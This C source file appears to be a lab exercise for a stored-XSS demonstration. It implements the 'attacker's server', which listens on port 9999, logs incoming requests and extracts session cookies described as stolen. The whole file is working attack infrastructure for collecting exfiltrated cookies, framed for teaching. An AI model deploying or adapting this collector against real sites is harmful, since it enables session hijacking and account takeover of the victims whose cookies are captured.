/*
 * ex3_stored.c
 * 
 * Stored XSS Attack Demonstration - Attacker's Server
 * 
 * This program implements a simple HTTP server that listens on port 9999
 * and captures HTTP requests containing stolen session cookies from a
 * stored XSS attack. It logs the entire request to spoofed-stored.txt
 * for analysis.
 * 
 * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_stored.c -o ex3_stored
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 9999
#define BUFFER_SIZE 8192
#define OUTPUT_FILE "spoofed-stored.txt"

/*
 * extract_cookie - Extracts and prints cookie information from HTTP request
 * @request: The raw HTTP request string
 * 
 * Searches for cookie data in the URL query parameters or Cookie header.
 */
static void extract_cookie(const char *request) {
    const char *cookie_param = strstr(request, "cookie=");
    if (cookie_param != NULL) {
        const char *param_end = strstr(cookie_param, " ");
        if (param_end == NULL) {
            param_end = strstr(cookie_param, "\r\n");
        }
        if (param_end == NULL) {
            param_end = strstr(cookie_param, "\n");
        }
        
        if (param_end != NULL) {
            size_t cookie_len = (size_t)(param_end - cookie_param);
            char *cookie = malloc(cookie_len + 1);
            if (cookie != NULL) {
                memcpy(cookie, cookie_param, cookie_len);
                cookie[cookie_len] = '\0';
                printf("Extracted: %s\n", cookie);
                free(cookie);
            }
        }
    }
    
    const char *cookie_header = strstr(request, "Cookie:");
    if (cookie_header == NULL) {
        cookie_header = strstr(request, "cookie:");
    }
    
    if (cookie_header != NULL) {
        const char *line_end = strstr(cookie_header, "\r\n");
        if (line_end == NULL) {
            line_end = strstr(cookie_header, "\n");
        }
        
        if (line_end != NULL) {
            size_t cookie_len = (size_t)(line_end - cookie_header);
            char *cookie = malloc(cookie_len + 1);
            if (cookie != NULL) {
                memcpy(cookie, cookie_header, cookie_len);
                cookie[cookie_len] = '\0';
                printf("Extracted: %s\n", cookie);
                free(cookie);
            }
        }
    }
}

/*
 * send_http_response - Sends a minimal HTTP 200 OK response
 * @client_fd: File descriptor of the connected client socket
 */
static void send_http_response(int client_fd) {
    const char *response = 
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: 27\r\n"
        "Connection: close\r\n"
        "Access-Control-Allow-Origin: *\r\n"
        "\r\n"
        "<html>Request logged</html>";
    
    ssize_t sent = write(client_fd, response, strlen(response));
    (void)sent;
}

int main(void) {
    int server_fd;
    int client_fd;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len;
    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;
    FILE *output_file;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("Setsockopt failed");
        close(server_fd);
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_fd);
        return 1;
    }

    if (listen(server_fd, 5) < 0) {
        perror("Listen failed");
        close(server_fd);
        return 1;
    }

    printf("Attacker's server listening on port %d...\n", PORT);
    printf("Waiting for stolen cookies from stored XSS attack...\n");

    client_addr_len = sizeof(client_addr);
    client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_addr_len);
    if (client_fd < 0) {
        perror("Accept failed");
        close(server_fd);
        return 1;
    }

    printf("Connection received from %s:%d\n", 
           inet_ntoa(client_addr.sin_addr), 
           ntohs(client_addr.sin_port));

    memset(buffer, 0, BUFFER_SIZE);
    bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);
    if (bytes_read < 0) {
        perror("Read failed");
        close(client_fd);
        close(server_fd);
        return 1;
    }

    buffer[bytes_read] = '\0';

    printf("Request captured (%zd bytes)\n", bytes_read);

    output_file = fopen(OUTPUT_FILE, "w");
    if (output_file == NULL) {
        perror("Failed to open output file");
        close(client_fd);
        close(server_fd);
        return 1;
    }

    if (fprintf(output_file, "%s", buffer) < 0) {
        perror("Failed to write to output file");
        fclose(output_file);
        close(client_fd);
        close(server_fd);
        return 1;
    }

    fclose(output_file);
    printf("Request written to %s\n", OUTPUT_FILE);

    extract_cookie(buffer);

    send_http_response(client_fd);

    close(client_fd);
    close(server_fd);

    printf("Server shutting down gracefully.\n");

    return 0;
}
